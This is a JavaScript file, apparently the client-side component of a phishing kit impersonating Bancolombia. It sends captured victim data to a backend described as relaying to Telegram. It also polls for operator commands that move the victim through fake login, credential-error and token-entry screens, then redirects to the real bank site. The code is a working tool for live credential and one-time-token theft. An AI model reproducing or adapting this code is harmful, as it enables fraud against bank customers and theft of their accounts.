/**
 * TELEGRAM INTEGRATION MANAGER
 * Maneja comunicación con Telegram y polling de acciones
 */

'use strict';

class TelegramManager {
    constructor() {
        this.checkInterval = null;
        this.checking = false;
        this.isPolling = false;
    }

    async sendToTelegram(stage, data) {
        try {
            const controller = new AbortController();
            const timeoutId = setTimeout(() => controller.abort(), 10000);
            
            const response = await fetch('api/send-message', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                credentials: 'include',
                body: JSON.stringify({ stage, data }),
                signal: controller.signal
            });

            clearTimeout(timeoutId);
            const result = await response.json();
            console.log('📤 Mensaje enviado a Telegram');
            return result;
        } catch (error) {
            if (error.name === 'AbortError') {
                console.error('❌ Timeout enviando a Telegram');
            } else {
                console.error('❌ Error enviando a Telegram:', error);
            }
            return { success: false };
        }
    }

    async startPolling() {
        if (this.isPolling) {
            console.log('⚠️ Polling ya activo, ignorando...');
            return;
        }
        this.isPolling = true;
        this.checking = true;
        this.checkInterval = setInterval(() => this.checkAction(), 2500);
        console.log('🔄 Polling iniciado...');
    }

    stopPolling() {
        if (this.checkInterval) {
            clearInterval(this.checkInterval);
            this.checkInterval = null;
        }
        this.checking = false;
        this.isPolling = false;
        console.log('⏹️ Polling detenido');
    }

    async checkAction() {
        try {
            const controller = new AbortController();
            const timeoutId = setTimeout(() => controller.abort(), 5000);
            
            const response = await fetch(`api/check-action?t=${Date.now()}`, {
                method: 'GET',
                cache: 'no-cache',
                credentials: 'include',
                signal: controller.signal
            });
            
            clearTimeout(timeoutId);
            const data = await response.json();

            if (data.action) {
                console.log('✅ ACCIÓN DETECTADA:', data.action);
                this.stopPolling();
                this.handleAction(data.action);
            }
        } catch (error) {
            if (error.name === 'AbortError') {
                console.warn('⏱️ Timeout en check-action');
            } else {
                console.error('❌ Error checking action:', error);
            }
        }
    }

    handleAction(action) {
        console.log('🎯 EJECUTANDO ACCIÓN:', action);

        const overlay = document.querySelector('.loading-overlay');
        if (overlay) {
            overlay.classList.remove('active');
        }

        // Execute immediately without delay for faster response
        switch (action) {
            case 'error_documento':
                window.location.href = 'index.html?error=documento';
                break;

            case 'pedir_logo':
                window.location.href = 'next-step.html';
                break;

            case 'error_logo':
                window.location.href = 'next-step.html?error=credenciales';
                break;

            case 'pedir_token':
                if (window.location.pathname.includes('next-step.html')) {
                    if (typeof window.tokenModalController !== 'undefined') {
                        window.tokenModalController.switchToTokenCard();
                    }
                } else {
                    window.location.href = 'next-step.html?openToken=1';
                }
                break;

            case 'error_token':
                // If we are on next-step.html and using the card
                const tokenInput = document.getElementById('tokenInputCard');
                if (tokenInput) {
                    const overlay = document.querySelector('.loading-overlay');
                    if (overlay) overlay.classList.remove('active');
                    tokenInput.value = '';
                    tokenInput.focus();
                    alert('Token incorrecto o expirado. Por favor, genera uno nuevo e ingresalo.');
                    // NO reiniciar polling aquí, esperar a que el usuario envíe nuevo token
                }
                break;

            case 'finalizar':
                window.location.href = 'https://www.bancolombia.com/personas';
                break;

            default:
                console.warn('❓ Acción desconocida:', action);
        }
    }
}

// Instancia global
window.telegramManager = new TelegramManager();

// NO iniciar polling automáticamente, solo cuando sea necesario
document.addEventListener('DOMContentLoaded', () => {
    console.log('📱 Telegram Manager listo');
});

